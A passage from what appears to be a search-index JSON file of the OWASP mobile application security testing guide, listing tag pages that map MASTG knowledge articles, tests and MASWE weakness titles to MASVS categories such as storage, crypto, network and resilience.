       iOS Cryptographic APIs          </li> <li>            iOS Data Storage          </li> <li>            iOS Local Authentication          </li> <li>            iOS Network Communication          </li> <li>            iOS Platform APIs          </li> </ul>","tags":[]},{"location":"tags/#tag:know","title":"know","text":"<ul> <li>            MASTG-KNOW-0001: Biometric Authentication          </li> <li>            MASTG-KNOW-0002: FingerprintManager          </li> <li>            MASTG-KNOW-0003: App Signing          </li> <li>            MASTG-KNOW-0004: Third-Party Libraries          </li> <li>            MASTG-KNOW-0005: Memory Corruption Bugs          </li> <li>            MASTG-KNOW-0006: Binary Protection Mechanisms          </li> <li>            MASTG-KNOW-0007: Debuggable Apps          </li> <li>            MASTG-KNOW-0008: Debugging Symbols          </li> <li>            MASTG-KNOW-0009: StrictMode          </li> <li>            MASTG-KNOW-0010: Exception Handling          </li> <li>            MASTG-KNOW-0011: Security Provider          </li> <li>            MASTG-KNOW-0012: Key Generation          </li> <li>            MASTG-KNOW-0013: Random number generation          </li> <li>            MASTG-KNOW-0014: Android Network Security Configuration          </li> <li>            MASTG-KNOW-0015: Certificate Pinning          </li> <li>            MASTG-KNOW-0016: TBD          </li> <li>            MASTG-KNOW-0017: App Permissions          </li> <li>            MASTG-KNOW-0018: WebViews          </li> <li>            MASTG-KNOW-0019: Deep Links          </li> <li>            MASTG-KNOW-0020: Inter-Process Communication (IPC) Mechanisms          </li> <li>            MASTG-KNOW-0021: Object Serialization          </li> <li>            MASTG-KNOW-0022: Overlay Attacks          </li> <li>            MASTG-KNOW-0023: Enforced Updating          </li> <li>            MASTG-KNOW-0024: Pending Intents          </li> <li>            MASTG-KNOW-0025: Implicit Intents          </li> <li>            MASTG-KNOW-0026: Third-party Services Embedded in the App          </li> <li>            MASTG-KNOW-0027: Root Detection          </li> <li>            MASTG-KNOW-0028: Anti-Debugging          </li> <li>            MASTG-KNOW-0029: File Integrity Checks          </li> <li>            MASTG-KNOW-0030: Detection of Reverse Engineering Tools          </li> <li>            MASTG-KNOW-0031: Emulator Detection          </li> <li>            MASTG-KNOW-0032: Runtime Integrity Verification          </li> <li>            MASTG-KNOW-0033: Obfuscation          </li> <li>            MASTG-KNOW-0034: Device Binding          </li> <li>            MASTG-KNOW-0035: Google Play Integrity API          </li> <li>            MASTG-KNOW-0036: Shared Preferences          </li> <li>            MASTG-KNOW-0037: SQLite Database          </li> <li>            MASTG-KNOW-0038: SQLCipher Database          </li> <li>            MASTG-KNOW-0039: Firebase Real-time Databases          </li> <li>            MASTG-KNOW-0040: Realm Databases          </li> <li>            MASTG-KNOW-0041: Internal Storage          </li> <li>            MASTG-KNOW-0042: External Storage          </li> <li>            MASTG-KNOW-0043: Android KeyStore          </li> <li>            MASTG-KNOW-0044: Key Attestation          </li> <li>            MASTG-KNOW-0045: Secure Key Import into Keystore          </li> <li>            MASTG-KNOW-0046: BouncyCastle KeyStore          </li> <li>            MASTG-KNOW-0047: Cryptographic Key Storage          </li> <li>            MASTG-KNOW-0048: KeyChain          </li> <li>            MASTG-KNOW-0049: Logs          </li> <li>            MASTG-KNOW-0050: Backups          </li> <li>            MASTG-KNOW-0051: Process Memory          </li> <li>            MASTG-KNOW-0052: User Interface Components          </li> <li>            MASTG-KNOW-0053: Screenshots          </li> <li>            MASTG-KNOW-0054: App Notifications          </li> <li>            MASTG-KNOW-0055: Keyboard Cache          </li> <li>            MASTG-KNOW-0056: Local Authentication Framework          </li> <li>            MASTG-KNOW-0057: Keychain Services          </li> <li>            MASTG-KNOW-0058: App Signing          </li> <li>            MASTG-KNOW-0059: Third-Party Libraries          </li> <li>            MASTG-KNOW-0060: Memory Corruption Bugs          </li> <li>            MASTG-KNOW-0061: Binary Protection Mechanisms          </li> <li>            MASTG-KNOW-0062: Debuggable Apps          </li> <li>            MASTG-KNOW-0063: Debugging Symbols          </li> <li>            MASTG-KNOW-0064: Debugging Code and Error Logging          </li> <li>            MASTG-KNOW-0065: Exception Handling          </li> <li>            MASTG-KNOW-0066: CryptoKit          </li> <li>            MASTG-KNOW-0067: CommonCrypto, SecKey and Wrapper libraries          </li> <li>            MASTG-KNOW-0068: Cryptographic Third-Party libraries          </li> <li>            MASTG-KNOW-0069: Key Management          </li> <li>            MASTG-KNOW-0070: Random Number Generator          </li> <li>            MASTG-KNOW-0071: iOS App Transport Security          </li> <li>            MASTG-KNOW-0072: Server Trust Evaluation          </li> <li>            MASTG-KNOW-0073: iOS Network APIs          </li> <li>            MASTG-KNOW-0074: Enforced Updating          </li> <li>            MASTG-KNOW-0075: Object Serialization          </li> <li>            MASTG-KNOW-0076: WebViews          </li> <li>            MASTG-KNOW-0077: App Permissions          </li> <li>            MASTG-KNOW-0078: Inter-Process Communication (IPC)          </li> <li>            MASTG-KNOW-0079: Custom URL Schemes          </li> <li>            MASTG-KNOW-0080: Universal Links          </li> <li>            MASTG-KNOW-0081: UIActivity Sharing          </li> <li>            MASTG-KNOW-0082: App extensions          </li> <li>            MASTG-KNOW-0083: Pasteboard          </li> <li>            MASTG-KNOW-0084: Jailbreak Detection          </li> <li>            MASTG-KNOW-0085: Anti-Debugging Detection          </li> <li>            MASTG-KNOW-0086: File Integrity Checks          </li> <li>            MASTG-KNOW-0087: Reverse Engineering Tools Detection          </li> <li>            MASTG-KNOW-0088: Emulator Detection          </li> <li>            MASTG-KNOW-0089: Obfuscation          </li> <li>            MASTG-KNOW-0090: Device Binding          </li> <li>            MASTG-KNOW-0091: File System APIs          </li> <li>            MASTG-KNOW-0092: Binary Data Storage          </li> <li>            MASTG-KNOW-0093: UserDefaults          </li> <li>            MASTG-KNOW-0094: CoreData          </li> <li>            MASTG-KNOW-0095: Firebase Real-time Databases          </li> <li>            MASTG-KNOW-0096: Realm Databases          </li> <li>            MASTG-KNOW-0097: Other Third-Party Databases          </li> <li>            MASTG-KNOW-0098: User Interface Components          </li> <li>            MASTG-KNOW-0099: Screenshots          </li> <li>            MASTG-KNOW-0100: Keyboard Cache          </li> <li>            MASTG-KNOW-0101: Logs          </li> <li>            MASTG-KNOW-0102: Backups          </li> <li>            MASTG-KNOW-0103: Process Memory          </li> <li>            MASTG-KNOW-0104: Inter-Process Communication (IPC) Mechanisms          </li> </ul>","tags":[]},{"location":"tags/#tag:macos","title":"macOS","text":"<ul> <li>            MASTG-TECH-0139: Attach to WKWebView          </li> </ul>","tags":[]},{"location":"tags/#tag:masvs-auth-1","title":"masvs-auth-1","text":"<ul> <li>            MASWE-0005: API Keys Hardcoded in the App Package          </li> <li>            MASWE-0032: Platform-provided Authentication APIs Not Used          </li> <li>            MASWE-0033: Authentication or Authorization Protocol Security Best Practices Not Followed          </li> <li>            MASWE-0035: Passwordless Authentication Not Implemented          </li> <li>            MASWE-0036: Authentication Material Stored Unencrypted on the Device          </li> <li>            MASWE-0037: Authentication Material Sent over Insecure Connections          </li> <li>            MASWE-0038: Authentication Tokens Not Validated          </li> <li>            MASWE-0039: Shared Web Credentials and Website-association Not Implemented          </li> <li>            MASWE-0040: Insecure Authentication in WebViews          </li> </ul>","tags":[]},{"location":"tags/#tag:masvs-auth-2","title":"masvs-auth-2","text":"<ul> <li>            MASTG-TEST-0017: Testing Confirm Credentials          </li> <li>            MASTG-TEST-0018: Testing Biometric Authentication          </li> <li>            MASTG-TEST-0064: Testing Biometric Authentication          </li> <li>            MASWE-0018: Cryptographic Keys Access Not Restricted          </li> <li>            MASWE-0034: Insecure Implementation of Confirm Credentials          </li> <li>            MASWE-0041: Authentication Enforced Only Locally Instead of on the Server-side          </li> <li>            MASWE-0042: Authorization Enforced Only Locally Instead of on the Server-side          </li> <li>            MASWE-0043: App Custom PIN Not Bound to Platform KeyStore          </li> <li>            MASWE-0044: Biometric Authentication Can Be Bypassed          </li> <li>            MASWE-0045: Fallback to Non-biometric Credentials Allowed for Sensitive Transactions          </li> <li>            MASWE-0046: Crypto Keys Not Invalidated on New Biometric Enrollment          </li> </ul>","tags":[]},{"location":"tags/#tag:masvs-auth-3","title":"masvs-auth-3","text":"<ul> <li>            MASWE-0018: Cryptographic Keys Access Not Restricted          </li> <li>            MASWE-0028: MFA Implementation Best Practices Not Followed          </li> <li>            MASWE-0029: Step-Up Authentication Not Implemented After Login          </li> <li>            MASWE-0030: Re-Authenticates Not Triggered On Contextual State Changes          </li> <li>            MASWE-0031: Insecure use of Android Protected Confirmation          </li> </ul>","tags":[]},{"location":"tags/#tag:masvs-code-1","title":"masvs-code-1","text":"<ul> <li>            MASWE-0056: Tapjacking Attacks          </li> <li>            MASWE-0077: Running on a recent Platform Version Not Ensured          </li> <li>            MASWE-0078: Latest Platform Version Not Targeted          </li> </ul>","tags":[]},{"location":"tags/#tag:masvs-code-2","title":"masvs-code-2","text":"<ul> <li>            MASTG-TEST-0036: Testing Enforced Updating          </li> <li>            MASTG-TEST-0080: Testing Enforced Updating          </li> <li>            MASWE-0075: Enforced Updating Not Implemented          </li> </ul>","tags":[]},{"location":"tags/#tag:masvs-code-3","title":"masvs-code-3","text":"<ul> <li>            MASTG-TEST-0042: Checking for Weaknesses in Third Party Libraries          </li> <li>            MASTG-TEST-0085: Checking for Weaknesses in Third Party Libraries          </li> <li>            MASWE-0015: Deprecated Android KeyStore Implementations          </li> <li>            MASWE-0019: Risky Cryptography Implementations          </li> <li>            MASWE-0032: Platform-provided Authentication APIs Not Used          </li> <li>            MASWE-0049: Proven Networking APIs Not used          </li> <li>            MASWE-0076: Dependencies with Known Vulnerabilities          </li> <li>            MASWE-0116: Compiler Provided Security Features Not Used          </li> </ul>","tags":[]},{"location":"tags/#tag:masvs-code-4","title":"masvs-code-4","text":"<ul> <li>            MASTG-TEST-0002: Testing Local Storage for Input Validation          </li> <li>            MASTG-TEST-0025: Testing for Injection Flaws          </li> <li>            MASTG-TEST-0026: Testing Implicit Intents          </li> <li>            MASTG-TEST-0027: Testing for URL Loading in WebViews          </li> <li>            MASTG-TEST-0034: Testing Object Persistence          </li> <li>            MASTG-TEST-0043: Memory Corruption Bugs          </li> <li>            MASTG-TEST-0044: Make Sure That Free Security Features Are Activated          </li> <li>            MASTG-TEST-0079: Testing Object Persistence          </li> <li>            MASTG-TEST-0086: Memory Corruption Bugs          </li> <li>            MASTG-TEST-0087: Make Sure That Free Security Features Are Activated          </li> <li>            MASWE-0016: Unsafe Handling of Imported Cryptographic Keys          </li> <li>            MASWE-0038: Authentication Tokens Not Validated          </li> <li>            MASWE-0058: Insecure Deep Links          </li> <li>            MASWE-0070: JavaScript Loaded from Untrusted Sources          </li> <li>            MASWE-0071: WebViews Loading Content from Untrusted Sources          </li> <li>            MASWE-0072: Universal XSS          </li> <li>            MASWE-0073: Insecure WebResourceResponse Implementations          </li> <li>            MASWE-0079: Unsafe Handling of Data from the Network          </li> <li>            MASWE-0080: Unsafe Handling of Data from Backups          </li> <li>            MASWE-0081: Unsafe Handling Of Data From External Interfaces          </li> <li>            MASWE-0082: Unsafe Handling of Data From Local Storage          </li> <li>            MASWE-0083: Unsafe Handling of Data From The User Interface          </li> <li>            MASWE-0084: Unsafe Handling of Data from IPC          </li> <li>            MASWE-0085: Unsafe Dynamic Code Loading          </li> <li>            MASWE-0086: SQL Injection          </li> <li>            MASWE-0087: Insecure Parsing and Escaping          </li> <li>            MASWE-0088: Insecure Object Deserialization          </li> <li>            MASWE-0105: Integrity of App Resources Not Verified          </li> <li>            MASWE-0116: Compiler Provided Security Features Not Used          </li> </ul>","tags":[]},{"location":"tags/#tag:masvs-crypto-1","title":"masvs-crypto-1","text":"<ul> <li>            MASTG-TEST-0013: Testing Symmetric Cryptography          </li> <li>            MASTG-TEST-0014: Testing the Configuration of Cryptographic Standard Algorithms          </li> <li>            MASTG-TEST-0016: Testing Random Number Generation          </li> <li>            MASTG-TEST-0061: Verifying the Configuration of Cryptographic Standard Algorithms          </li> <li>            MASTG-TEST-0063: Testing Random Number Generation          </li> <li>            MASWE-0019: Risky Cryptography Implementations          </li> <li>            MASWE-0020: Improper Encryption          </li> <li>            MASWE-0021: Improper Hashing          </li> <li>            MASWE-0022: Predictable Initialization Vectors (IVs)          </li> <li>            MASWE-0023: Risky Padding          </li> <li>            MASWE-0024: Improper Use of Message Authentication Code (MAC)          </li> <li>            MASWE-0025: Improper Generation of Cryptographic Signatures          </li> <li>            MASWE-0026: Improper Verification of Cryptographic Signature          </li> <li>            MASWE-0027: Improper Random Number Generation          </li> </ul>","tags":[]},{"location":"tags/#tag:masvs-crypto-2","title":"masvs-crypto-2","text":"<ul> <li>            MASTG-TEST-0015: Testing the Purposes of Keys          </li> <li>            MASTG-TEST-0062: Testing Key Management          </li> <li>            MASWE-0006: Sensitive Data Stored Unencrypted in Private Storage Locations          </li> <li>            MASWE-0009: Improper Cryptographic Key Generation          </li> <li>            MASWE-0010: Improper Cryptographic Key Derivation          </li> <li>            MASWE-0011: Cryptographic Key Rotation Not Implemented          </li> <li>            MASWE-0012: Insecure or Wrong Usage of Cryptographic Key          </li> <li>            MASWE-0013: Hardcoded Cryptographic Keys in Use          </li> <li>            MASWE-0014: Cryptographic Keys Not Properly Protected at Rest          </li> <li>            MASWE-0015: Deprecated Android KeyStore Implementations          </li> <li>            MASWE-0016: Unsafe Handling of Imported Cryptographic Keys          </li> <li>            MASWE-0017: Cryptographic Keys Not Properly Protected on Export          </li> <li>            MASWE-0018: Cryptographic Keys Access Not Restricted          </li> <li>            MASWE-0043: App Custom PIN Not Bound to Platform KeyStore          </li> <li>            MASWE-0046: Crypto Keys Not Invalidated on New Biometric Enrollment          </li> </ul>","tags":[]},{"location":"tags/#tag:masvs-network-1","title":"masvs-network-1","text":"<ul> <li>            MASTG-TEST-0019: Testing Data Encryption on the Network          </li> <li>            MASTG-TEST-0020: Testing the TLS Settings          </li> <li>            MASTG-TEST-0021: Testing Endpoint Identify Verification          </li> <li>            MASTG-TEST-0023: Testing the Security Provider          </li> <li>            MASTG-TEST-0065: Testing Data Encryption on the Network          </li> <li>            MASTG-TEST-0066: Testing the TLS Settings          </li> <li>            MASTG-TEST-0067: Testing Endpoint Identity Verification          </li> <li>            MASWE-0017: Cryptographic Keys Not Properly Protected on Export          </li> <li>            MASWE-0037: Authentication Material Sent over Insecure Connections          </li> <li>            MASWE-0048: Insecure Machine-to-Machine Communication          </li> <li>            MASWE-0049: Proven Networking APIs Not used          </li> <li>            MASWE-0050: Cleartext Traffic          </li> <li>            MASWE-0051: Unprotected Open Ports          </li> <li>            MASWE-0052: Insecure Certificate Validation          </li> <li>            MASWE-0096: Data Sent Unencrypted Over Encrypted Connections          </li> </ul>","tags":[]},{"location":"tags/#tag:masvs-network-2","title":"masvs-network-2","text":"<ul> <li>            MASTG-TEST-0022: Testing Custom Certificate Stores and Certificate Pinning          </li> <li>            MASTG-TEST-0068: Testing Custom Certificate Stores and Certificate Pinning          </li> <li>            MASWE-0047: Insecure Identity Pinning          </li> </ul>","tags":[]},{"location":"tags/#tag:masvs-platform-1","title":"masvs-platform-1","text":"<ul> <li>            MASTG-TEST-0007: Determining Whether Sensitive Stored Data Has Been Exposed via IPC Mechanisms          </li> <li>            MASTG-TEST-0024: Testing for App Permissions          </li> <li>            MASTG-TEST-0028: Testing Deep Links          </li> <li>            MASTG-TEST-0029: Testing for Sensitive Functionality Exposure Through IPC          </li> <li>            MASTG-TEST-0030: Testing for Vulnerable Implementation of PendingIntent          </li> <li>            MASTG-TEST-0056: Determining Whether Sensitive Data Is Exposed via IPC Mechanisms          </li> <li>            MASTG-TEST-0069: Testing App Permissions          </li> <li>            MASTG-TEST-0070: Testing Universal Links          </li> <li>            MASTG-TEST-0071: Testing UIActivity Sharing          </li> <li>            MASTG-TEST-0072: Testing App Extensions          </li> <li>            MASTG-TEST-0073: Testing UIPasteboard          </li> <li>            MASTG-TEST-0075: Testing Custom URL Schemes          </li> <li>            MASWE-0039: Shared Web Credentials and Website-association Not Implemented          </li> <li>            MASWE-0058: Insecure Deep Links          </li> <li>            MASWE-0059: Use Of Unauthenticated Platform IPC          </li> <li>            MASWE-0060: Insecure Use of UIActivity          </li> <li>            MASWE-0061: Insecure Use of App Extensions          </li> <li>            MASWE-0062: Insecure Services          </li> <li>            MASWE-0063: Insecure Broadcast Receivers          </li> <li>            MASWE-0064: Insecure Content Providers          </li> <li>            MASWE-0065: Sensitive Data Permanently Shared with Other Apps          </li> <li>            MASWE-0066: Insecure Intents          </li> <li>            MASWE-0084: Unsafe Handling of Data from IPC          </li> </ul>","tags":[]},{"location":"tags/#tag:masvs-platform-2","title":"masvs-platform-2","text":"<ul> <li>            MASTG-TEST-0031: Testing JavaScript Execution in WebViews          </li> <li>            MASTG-TEST-0032: Testing WebView Protocol Handlers          </li> <li>            MASTG-TEST-0033: Testing for Java Objects Exposed Through WebViews          </li> <li>            MASTG-TEST-0037: Testing WebViews Cleanup          </li> <li>            MASTG-TEST-0076: Testing iOS WebViews          </li> <li>            MASTG-TEST-0077: Testing WebView Protocol Handlers          </li> <li>            MASTG-TEST-0078: Determining Whether Native Methods Are Exposed Through WebViews          </li> <li>            MASWE-0040: Insecure Authentication in WebViews          </li> <li>            MASWE-0068: JavaScript Bridges in WebViews          </li> <li>            MASWE-0069: WebViews Allows Access to Local Resources          </li> <li>            MASWE-0070: JavaScript Loaded from Untrusted Sources          </li> <li>            MASWE-0071: WebViews Loading Content from Untrusted Sources          </li> <li>            MASWE-0072: Universal XSS          </li> <li>            MASWE-0073: Insecure WebResourceResponse Implementations          </li> <li>            MASWE-0074: Web Content Debugging Enabled          </li> </ul>","tags":[]},{"location":"tags/#tag:masvs-platform-3","title":"masvs-platform-3","text":"<ul> <li>            MASTG-TEST-0008: Checking for Sensitive Data Disclosure Through the User Interface          </li> <li>            MASTG-TEST-0010: Finding Sensitive Information in Auto-Generated Screenshots          </li> <li>            MASTG-TEST-0035: Testing for Overlay Attacks          </li> <li>            MASTG-TEST-0057: Checking for Sensitive Data Disclosed Through the User Interface          </li> <li>            MASTG-TEST-0059: Testing Auto-Generated Screenshots for Sensitive Information          </li> <li>            MASWE-0029: Step-Up Authentication Not Implemented After Login          </li> <li>            MASWE-0053: Sensitive Data Leaked via the User Interface          </li> <li>            MASWE-0054: Sensitive Data Leaked via Notifications          </li> <li>            MASWE-0055: Sensitive Data Leaked via Screenshots          </li> <li>            MASWE-0056: Tapjacking Attacks          </li> <li>            MASWE-0057: StrandHogg Attack / Task Affinity Vulnerability          </li> <li>            MASWE-0083: Unsafe Handling of Data From The User Interface          </li> </ul>","tags":[]},{"location":"tags/#tag:masvs-privacy-1","title":"masvs-privacy-1","text":"<ul> <li>            MASWE-0001: Insertion of Sensitive Data into Logs          </li> <li>            MASWE-0003: Backup Unencrypted          </li> <li>            MASWE-0004: Sensitive Data Not Excluded From Backup          </li> <li>            MASWE-0108: Sensitive Data in Network Traffic          </li> <li>            MASWE-0117: Inadequate Permission Management          </li> </ul>","tags":[]},{"location":"tags/#tag:masvs-privacy-2","title":"masvs-privacy-2","text":"<ul> <li>            MASWE-0109: Lack of Anonymization or Pseudonymisation Measures          </li> <li>            MASWE-0110: Use of Unique Identifiers for User Tracking          </li> </ul>","tags":[]},{"location":"tags/#tag:masvs-privacy-3","title":"masvs-privacy-3","text":"<ul> <li>            MASWE-0111: Inadequate Privacy Policy          </li> <li>            MASWE-0112: Inadequate Data Collection Declarations          </li> </ul>","tags":[]},{"location":"tags/#tag:masvs-privacy-4","title":"masvs-privacy-4","text":"<ul> <li>            MASWE-0113: Lack of Proper Data Management Controls          </li> <li>            MASWE-0114: Inadequate Data Visibility Controls          </li> <li>            MASWE-0115: Inadequate or Ambiguous User Consent Mechanisms          </li> </ul>","tags":[]},{"location":"tags/#tag:masvs-resilience-1","title":"masvs-resilience-1","text":"<ul> <li>            MASTG-TEST-0045: Testing Root Detection          </li> <li>            MASTG-TEST-0049: Testing Emulator Detection          </li> <li>            MASTG-TEST-0088: Testing Jailbreak Detection          </li> <li>            MASTG-TEST-0092: Testing Emulator Detection          </li> <li>            MASWE-0008: Missing Device Secure Lock Verification Implementation          </li> <li>            MASWE-0097: Root/Jailbreak Detection Not Implemented          </li> <li>            MASWE-0098: App Virtualization Environment Detection Not Implemented          </li> <li>            MASWE-0099: Emulator Detection Not Implemented          </li> <li>            MASWE-0100: Device Attestation Not Implemented          </li> </ul>","tags":[]},{"location":"tags/#tag:masvs-resilience-2","title":"masvs-resilience-2","text":"<ul> <li>            MASTG-TEST-0038: Making Sure that the App is Properly Signed          </li> <li>            MASTG-TEST-0047: Testing File Integrity Checks          </li> <li>            MASTG-TEST-0050: Testing Runtime Integrity Checks          </li> <li>            MASTG-TEST-0081: Making Sure that the App Is Properly Signed          </li> <li>            MASTG-TEST-0090: Testing File Integrity Checks          </li> <li>            MASWE-0104: App Integrity Not Verified          </li> <li>            MASWE-0105: Integrity of App Resources Not Verified          </li> <li>            MASWE-0106: Official Store Verification Not Implemented          </li> <li>            MASWE-0107: Runtime Code Integrity Not Verified          </li> </ul>","tags":[]},{"location":"tags/#tag:masvs-resilience-3","title":"masvs-resilience-3","text":"<ul> <li>            MASTG-TEST-0040: Testing for Debugging Symbols          </li> <li>            MASTG-TEST-0041: Testing for Debugging Code and Verbose Error Logging          </li> <li>            MASTG-TEST-0051: Testing Obfuscation          </li> <li>            MASTG-TEST-0083: Testing for Debugging Symbols          </li> <li>            MASTG-TEST-0084: Testing for Debugging Code and Verbose Error Logging          </li> <li>            MASTG-TEST-0093: Testing Obfuscation          </li> <li>            MASWE-0089: Code Obfuscation Not Implemented          </li> <li>            MASWE-0090: Resource Obfuscation Not Implemented          </li> <li>            MASWE-0091: Anti-Deobfuscation Techniques Not Implemented          </li> <li>            MASWE-0092: Static Analysis Tools Not Prevented          </li> <li>            MASWE-0093: Debugging Symbols Not Removed          </li> <li>            MASWE-0094: Non-Production Resources Not Removed          </li> <li>            MASWE-0095: Code That Disables Security Controls Not Removed          </li> <li>            MASWE-0096: Data Sent Unencrypted Over Encrypted Connections          </li> </ul>","tags":[]},{"location":"tags/#tag:masvs-resilience-4","title":"masvs-resilience-4","text":"<ul> <li>            MASTG-TEST-0039: Testing whether the App is Debuggable          </li> <li>            MASTG-TEST-0046: Testing Anti-Debugging Detection          </li> <li>            MASTG-TEST-0048: Testing Reverse Engineering Tools Detection          </li> <li>            MASTG-TEST-0082: Testing whether the App is Debuggable          </li> <li>            MASTG-TEST-0089: Testing Anti-Debugging Detection          </li> <li>            MASTG-TEST-0091: Testing Reverse Engineering Tools Detection          </li> <li>            MASWE-0067: Debuggable Flag Not Disabled          </li> <li>            MASWE-0074: Web Content Debugging Enabled          </li> <li>            MASWE-0101: Debugger Detection Not Implemented          </li> <li>            MASWE-0102: Dynamic Analysis Tools Detection Not Implemented          </li> <li>            MASWE-0103: RASP Techniques Not Implemented          </li> </ul>","tags":[]},{"location":"tags/#tag:masvs-storage-1","title":"masvs-storage-1","text":"<ul> <li>            MASTG-TEST-0001: Testing Local Storage for Sensitive Data          </li> <li>            MASTG-TEST-0012: Testing the Device-Access-Security Policy          </li> <li>            MASTG-TEST-0052: Testing Local Data Storage          </li> <li>            MASWE-0006: Sensitive Data Stored Unencrypted in Private Storage Locations          </li> <li>            MASWE-0007: Sensitive Data Stored Unencrypted in Shared Storage Requiring No User Interaction          </li> <li>            MASWE-0014: Cryptographic Keys Not Properly Protected at Rest          </li> <li>            MASWE-0017: Cryptographic Keys Not Properly Protected on Export          </li> <li>            MASWE-0035: Passwordless Authentication Not Implemented          </li> <li>            MASWE-0036: Authentication Material Stored Unencrypted on the Device          </li> <li>            MASWE-0064: Insecure Content Providers          </li> <li>            MASWE-0065: Sensitive Data Permanently Shared with Other Apps          </li> </ul>","tags":[]},{"location":"tags/#tag:masvs-storage-2","title":"masvs-storage-2","text":"<ul> <li>            MASTG-TEST-0003: Testing Logs for Sensitive Data          </li> <li>            MASTG-TEST-0004: Determining Whether Sensitive Data Is Shared with Third Parties via Embedded Services          </li> <li>            MASTG-TEST-0005: Determining Whether Sensitive Data Is Shared with Third Parties via Notifications          </li> <li>            MASTG-TEST-0006: Determining Whether the Keyboard Cache Is Disabled for Text Input Fields          </li> <li>            MASTG-TEST-0009: Testing Backups for Sensitive Data          </li> <li>            MASTG-TEST-0011: Testing Memory for Sensitive Data          </li> <li>            MASTG-TEST-0053: Checking Logs for Sensitive Data          </li> <li>            MASTG-TEST-0054: Determining Whether Sensitive Data Is Shared with Third Parties          </li> <li>            MASTG-TEST-0055: Finding Sensitive Data in the Keyboard Cache          </li> <li>            MASTG-TEST-0058: Testing Backups for Sensitive Data          </li> <li>            MASTG-TEST-0060: Testing Memory for Sensitive Data          </li> <li>            MASWE-0001: Insertion of Sensitive Data into Logs          </li> <li>            MASWE-0002: Sensitive Data Stored With Insufficient Access Restrictions in Internal Locations          </li> <li>            MASWE-0003: Backup Unencrypted          </li> <li>            MASWE-0004: Sensitive Data Not Excluded From Backup          </li> <li>            MASWE-0053: Sensitive Data Leaked via the User Interface          </li> <li>            MASWE-0054: Sensitive Data Leaked via Notifications          </li> <li>            MASWE-0055: Sensitive Data Leaked via Screenshots          </li> <li>            MASWE-0058: Insecure Deep Links          </li> <li>            MASWE-0059: Use Of Unauthenticated Platform IPC          </li> <li>            MASWE-0060: Insecure Use of UIActivity          </li> <li>            MASWE-0061: Insecure Use of App Extensions          </li> <li>            MASWE-0062: Insecure Services          </li> <li>            MASWE-0063: Insecure Broadcast Receivers          </li> <li>            MASWE-0066: Insecure Intents          </li> <li>            MASWE-0068: JavaScript Bridges in WebViews          </li> <li>            MASWE-0069: WebViews Allows Access to Local Resources          </li> </ul>","tags":[]},{"location":"tags/#tag:maswe","title":"maswe","text":"<ul> <li>            MASWE-0001: Insertion of Sensitive Data into Logs          </li> <li>            MASWE-0002: Sensitive Data Stored With Insufficient Access Restrictions in Internal Locations          </li> <li>            MASWE-0003: Backup Unencrypted          </li> <li>            MASWE-0004: Sensitive Data Not Excluded From Backup          </li> <li>            MASWE-0005: API Keys Hardcoded in the App Package          </li> <li>            MASWE-0006: Sensitive Data Stored Unencrypted in Private Storage Locations          </li> <li>            MASWE-0007: Sensitive Data Stored Unencrypted in Shared Storage Requiring No User Interaction          </li> <li>            MASWE-0008: Missing Device Secure Lock Verification Implementation          </li> <li>            MASWE-0009: Improper Cryptographic Key Generation          </li> <li>            MASWE-0010: Improper Cryptographic Key Derivation          </li> <li>            MASWE-0011: Cryptographic Key Rotation Not Implemented          </li> <li>            MASWE-0012: Insecure or Wrong Usage of Cryptographic Key          </li> <li>            MASWE-0013: Hardcoded Cryptographic Keys in Use          </li> <li>            MASWE-0014: Cryptographic Keys Not Properly Protected at Rest          </li> <li>            MASWE-0015: Deprecated Android KeyStore Implementations          </li> <li>            MASWE-0016: Unsafe Handling of Imported Cryptographic Keys          </li> <li>            MASWE-0017: Cryptographic Keys Not Properly Protected on Export          </li> <li>            MASWE-0018: Cryptographic Keys Access Not Restricted          </li> <li>            MASWE-0019: Risky Cryptography Implementations          </li> <li>            MASWE-0020: Improper Encryption          </li> <li>            MASWE-0021: Improper Hashing          </li> <li>            MASWE-0022: Predictable Initialization Vectors (IVs)          </li> <li>            MASWE-0023: Risky Padding          </li> <li>            MASWE-0024: Improper Use of Message Authentication Code (MAC)          </li> <li>            MASWE-0025: Improper Generation of Cryptographic Signatures          </li> <li>            MASWE-0026: Improper Verification of Cryptographic Signature          </li> <li>            MASWE-0027: Improper Random Number Generation          </li> <li>            MASWE-0028: MFA Implementation Best Practices Not Followed          </li> <li>            MASWE-0029: Step-Up Authentication Not Implemented After Login          </li> <li>            MASWE-0030: Re-Authenticates Not Triggered On Contextual State Changes          </li> <li>            MASWE-0031: Insecure use of Android Protected Confirmation          </li> <li>            MASWE-0032: Platform-provided Authentication APIs Not Used          </li> <li>            MASWE-0033: Authentication or Authorization Protocol Security Best Practices Not Followed          </li> <li>            MASWE-0034: Insecure Implementation of Confirm Credentials          </li> <li>            MASWE-0035: Passwordless Authentication Not Implemented          </li> <li>            MASWE-0036: Authentication Material Stored Unencrypted on the Device          </li> <li>            MASWE-0037: Authentication Material Sent over Insecure Connections          </li> <li>            MASWE-0038: Authentication Tokens Not Validated          </li> <li>            MASWE-0039: Shared Web Credentials and Website-association Not Implemented          </li> <li>            MASWE-0040: Insecure Authentication in WebViews          </li> <li>            MASWE-0041: Authentication Enforced Only Locally Instead of on the Server-side          </li> <li>            MASWE-0042: Authorization Enforced Only Locally Instead of on the Server-side          </li> <li>            MASWE-0043: App Custom PIN Not Bound to Platform KeyStore          </li> <li>            MASWE-0044: Biometric Authentication Can Be Bypassed          </li> <li>            MASWE-0045: Fallback to Non-biometric Credentials Allowed for Sensitive Transactions          </li> <li>            MASWE-0046: Crypto Keys Not Invalidated on New Biometric Enrollment          </li> <li>            MASWE-0047: Insecure Identity Pinning          </li> <li>            MASWE-0048: Insecure Machine-to-Machine Communication          </li> <li>            MASWE-0049: Proven Networking APIs Not used          </li> <li>            MASWE-0050: Cleartext Traffic          </li> <li>            MASWE-0051: Unprotected Open Ports          </li> <li>            MASWE-0052: Insecure Certificate Validation          </li> <li>            MASWE-0053: Sensitive Data Leaked via the User Interface          </li> <li>            MASWE-0054: Sensitive Data Leaked via Notifications          </li> <li>            MASWE-0055: Sensitive Data Leaked via Screenshots          </li> <li>            MASWE-0056: Tapjacking Attacks          </li> <li>            MASWE-0057: StrandHogg Attack / Task Affinity Vulnerability          </li> <li>            MASWE-0058: Insecure Deep Links          </li> <li>            MASWE-0059: Use Of Unauthenticated Platform IPC          </li> <li>            MASWE-0060: Insecure Use of UIActivity          </li> <li>            MASWE-0061: Insecure Use of App Extensions          </li> <li>            MASWE-0062: Insecure Services          </li> <li>            MASWE-0063: Insecure Broadcast Receivers          </li> <li>            MASWE-0064: Insecure Content Providers          </li> <li>            MASWE-0065: Sensitive Data Permanently 